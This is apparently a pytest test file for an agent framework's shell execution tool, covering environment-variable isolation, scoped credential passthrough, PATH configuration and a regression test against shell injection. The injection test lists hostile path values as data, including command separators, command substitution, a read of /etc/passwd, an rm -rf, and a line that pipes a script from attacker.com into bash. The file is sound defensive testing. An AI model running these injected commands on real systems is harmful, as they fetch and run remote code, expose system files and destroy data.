"""Tests for exec tool environment isolation."""

import sys

import pytest

from nanobot.agent.tools.shell import ExecTool
from tests._kernel_env import credential_env

_UNIX_ONLY = pytest.mark.skipif(sys.platform == "win32", reason="Unix shell commands")


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_does_not_leak_parent_env(monkeypatch):
    """Env vars from the parent process must not be visible to commands."""
    monkeypatch.setenv("NANOBOT_SECRET_TOKEN", "super-secret-value")
    tool = ExecTool()
    result = await tool.execute(command="printenv NANOBOT_SECRET_TOKEN")
    assert "super-secret-value" not in result


@pytest.mark.asyncio
async def test_exec_has_working_path():
    """Basic commands should be available via the login shell's PATH."""
    tool = ExecTool()
    result = await tool.execute(command="echo hello")
    assert "hello" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append():
    """The pathAppend config should be available in the command's PATH."""
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="echo $PATH")
    assert "/opt/custom/bin" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_preserves_system_path():
    """pathAppend must not clobber standard system paths."""
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="ls /")
    assert "Exit code: 0" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_prepend_takes_lookup_precedence(tmp_path):
    """pathPrepend should win over pathAppend for executable lookup."""
    preferred = tmp_path / "preferred"
    fallback = tmp_path / "fallback"
    preferred.mkdir()
    fallback.mkdir()
    preferred_tool = preferred / "pathprobe"
    fallback_tool = fallback / "pathprobe"
    preferred_tool.write_text("#!/bin/sh\necho preferred\n", encoding="utf-8")
    fallback_tool.write_text("#!/bin/sh\necho fallback\n", encoding="utf-8")
    preferred_tool.chmod(0o755)
    fallback_tool.chmod(0o755)

    tool = ExecTool(path_prepend=str(preferred), path_append=str(fallback))
    result = await tool.execute(command="pathprobe")

    assert "preferred" in result
    assert "fallback" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_allowed_env_keys_passthrough():
    """Keys listed in allowed_env_keys come from the host resolver (scope exec)."""
    env = credential_env({"MY_CUSTOM_VAR": "hello-from-config"}, scopes={"MY_CUSTOM_VAR": ["exec"]})
    tool = ExecTool(allowed_env_keys=["MY_CUSTOM_VAR"], env=env)
    result = await tool.execute(command="printenv MY_CUSTOM_VAR")
    assert "hello-from-config" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_allowed_env_keys_does_not_leak_others(monkeypatch):
    """Resolver entries NOT in allowed_env_keys should still be blocked."""
    monkeypatch.setenv("MY_SECRET_VAR", "secret-value")
    env = credential_env(
        {"MY_CUSTOM_VAR": "hello-from-config", "MY_SECRET_VAR": "secret-value"},
        scopes={"MY_CUSTOM_VAR": ["exec"], "MY_SECRET_VAR": ["exec"]},
    )
    tool = ExecTool(allowed_env_keys=["MY_CUSTOM_VAR"], env=env)
    result = await tool.execute(command="printenv MY_SECRET_VAR")
    assert "secret-value" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_allowed_env_keys_missing_var_ignored(monkeypatch):
    """An allowed key the host resolver lacks is skipped, even if the process has it."""
    monkeypatch.setenv("NONEXISTENT_VAR_12345", "ambient-must-be-ignored")
    tool = ExecTool(allowed_env_keys=["NONEXISTENT_VAR_12345"], env=credential_env())
    result = await tool.execute(command="printenv NONEXISTENT_VAR_12345")
    assert "Exit code: 1" in result


# --- path_append injection prevention ------------------------------------


@_UNIX_ONLY
@pytest.mark.asyncio
@pytest.mark.parametrize(
    "malicious_path",
    [
        # semicolon — classic command separator
        '/tmp/bin; echo INJECTED',
        # command substitution via $()
        '/tmp/bin; echo $(whoami)',
        # backtick command substitution
        "/tmp/bin; echo `id`",
        # pipe to another command
        '/tmp/bin; cat /etc/passwd',
        # chained with &&
        '/tmp/bin && curl http://attacker.com/shell.sh | bash',
        # newline injection
        '/tmp/bin\necho INJECTED',
        # mixed shell metacharacters
        '/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED',
    ],
)
async def test_exec_path_append_shell_metacharacters_not_executed(malicious_path, tmp_path):
    """Shell metacharacters in path_append must NOT be interpreted as commands.

    Regression test for: path_append was previously concatenated into a shell
    command string via f'export PATH="$PATH:{path_append}"; {command}', which
    allowed shell injection.  After the fix, path_append is passed through the
    env dict so metacharacters are treated as literal path characters.
    """
    tool = ExecTool(path_append=malicious_path)
    result = await tool.execute(command="echo SAFE_OUTPUT")

    # The original command should succeed
    assert "SAFE_OUTPUT" in result

    # None of the injected payloads should have produced side-effects
    assert "INJECTED" not in result
    assert "root:" not in result  # /etc/passwd content


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_command_substitution_does_not_execute(tmp_path):
    """$() in path_append must not trigger command substitution.

    We create a marker file and try to read it via $(cat ...).  If command
    substitution works, the marker content appears in output.
    """
    marker = tmp_path / "secret_marker.txt"
    marker.write_text("SHOULD_NOT_APPEAR")

    tool = ExecTool(
        path_append=f'/tmp/bin; echo $(cat {marker})',
    )
    result = await tool.execute(command="echo OK")

    assert "OK" in result
    assert "SHOULD_NOT_APPEAR" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_legitimate_path_still_works():
    """A normal, safe path_append value must still be appended to PATH."""
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="echo $PATH")
    assert "/opt/custom/bin" in result


# --- child env from the host env (R3, Task 4) --------------------------------


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_base_env_comes_from_host_env(monkeypatch):
    """HOME/LANG/TERM come from env.exec_base_env, not the kernel process."""
    monkeypatch.setenv("LANG", "ambient-must-be-ignored")
    env = credential_env(exec_base_env={"HOME": "/kernel-home", "LANG": "C.UTF-8"})
    tool = ExecTool(env=env)
    assert tool._build_env()["HOME"] == "/kernel-home"
    assert tool._build_env()["LANG"] == "C.UTF-8"
    result = await tool.execute(command="printenv LANG")
    assert "ambient-must-be-ignored" not in result


def test_exec_allowed_key_outside_exec_scope_is_not_passed():
    env = credential_env({"MY_CUSTOM_VAR": "v"}, scopes={"MY_CUSTOM_VAR": ["tool:web"]})
    tool = ExecTool(allowed_env_keys=["MY_CUSTOM_VAR"], env=env)
    assert "MY_CUSTOM_VAR" not in tool._build_env()


def test_exec_empty_host_env_defaults_without_reading_process(monkeypatch):
    monkeypatch.setenv("HOME", "/ambient-home")
    monkeypatch.setenv("TERM", "ambient-term")
    built = ExecTool(env=credential_env())._build_env()
    assert built["HOME"] == "/tmp"
    assert built["TERM"] == "dumb"


def test_exec_legacy_environment_keeps_process_env_behaviour(tmp_path, monkeypatch):
    """Legacy hosts: allowed keys and HOME still come from the process env."""
    from nanobot.agent.tools.context import ToolContext
    from nanobot.config.schema import Config
    from nanobot.kernel.legacy import LegacyEnvironment

    monkeypatch.setenv("MY_CUSTOM_VAR", "legacy-value")
    monkeypatch.setenv("HOME", "/legacy-home")
    config = Config.model_validate({
        "tools": {"exec": {"allowedEnvKeys": ["MY_CUSTOM_VAR"]}},
        "agents": {"defaults": {"workspace": str(tmp_path)}},
    })
    env = LegacyEnvironment.from_config(config)
    tool = ExecTool.create(ToolContext(config=config.tools, workspace=str(tmp_path), env=env))
    built = tool._build_env()
    assert built["MY_CUSTOM_VAR"] == "legacy-value"
    assert built["HOME"] == "/legacy-home"


def test_exec_without_env_keeps_direct_process_env_fallback(monkeypatch):
    monkeypatch.setenv("MY_CUSTOM_VAR", "direct-value")
    built = ExecTool(allowed_env_keys=["MY_CUSTOM_VAR"])._build_env()
    assert built["MY_CUSTOM_VAR"] == "direct-value"
